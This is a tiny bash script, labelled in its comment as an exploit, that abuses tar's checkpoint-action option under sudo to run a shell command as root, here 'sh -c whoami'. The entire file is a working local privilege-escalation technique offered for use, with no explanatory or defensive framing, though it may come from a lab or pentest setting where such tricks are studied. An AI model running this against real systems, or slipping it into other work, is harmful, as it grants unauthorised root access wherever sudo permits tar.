#!/usr/bin/env bash
set -e

# Exploit sudo-gtfo tar checkpoint: escalate to root via tar
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c whoami' 2>/dev/null
